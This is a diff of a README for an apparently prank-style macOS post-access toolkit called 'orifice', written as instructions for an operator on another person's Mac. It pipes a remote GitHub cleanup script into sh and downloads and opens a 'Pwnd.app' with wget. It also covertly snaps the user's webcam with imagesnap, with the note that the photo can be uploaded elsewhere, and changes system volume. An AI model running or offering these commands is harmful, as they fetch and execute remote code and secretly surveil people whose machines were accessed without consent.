@@ -7,26 +7,59 @@
  \__, /_/ |_/\___/_/   \__,_//____/\___/\___/
 /____/                              orifice
 
+General:
+--------
+If you want to get some easier functionality you may want to load the users bash profile. You should at least benefit from their PATH settings
+
+  source ~/.bash_profile
 
 
-cleanup script:
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh)"
-* also in .hidden
+Cleanup Script:
+---------------
+When you're all done, run the cleanup:
 
-photo stuff:
-brew install imagesnap
-imagesnap ~/Desktop/$(date +%y%m%d%H%M%S).png
+  sh -c "$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh)"
 
-app exec:
-wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/pwnd.tar.gz
-tar -zxvf pwnd.tar.gz
-open Pwnd.app
+Script should also in preloaded and executable in .hidden
 
-volume etc:
-osascript -e 'set volume 7'
+Photo Stuff:
+------------
+If you want to have a little fun with their camera... first (assuming you loaded their bash profile) maybe check to see if imagesnap is already installed:
 
-urls...
-rick: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+  which imagesnap
+
+If not, you can install it yourself:
+
+  brew install imagesnap
+
+Once installed you can take a picture and put it on their desktop... or upload it somewhere else etc.
+
+  imagesnap ~/Desktop/$(date +%y%m%d%H%M%S).png
+
+App Exec:
+---------
+Experimental demo using non-malicious app... Retrieve the app and extract it
+
+  wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/pwnd.tar.gz
+  tar -zxvf pwnd.tar.gz
+
+You can run the app on the desktop via:
+
+  open Pwnd.app
+
+Not sure if default permisisons wil allow it to load... needs more testing.
+
+Volume etc:
+-----------
+Turn up the volume:
+
+  osascript -e 'set volume 7'
+
+Handy Urls:
+-----------
+rickroll:
+
+  https://www.youtube.com/watch?v=dQw4w9WgXcQ
 
 
 -------------------------------------------------
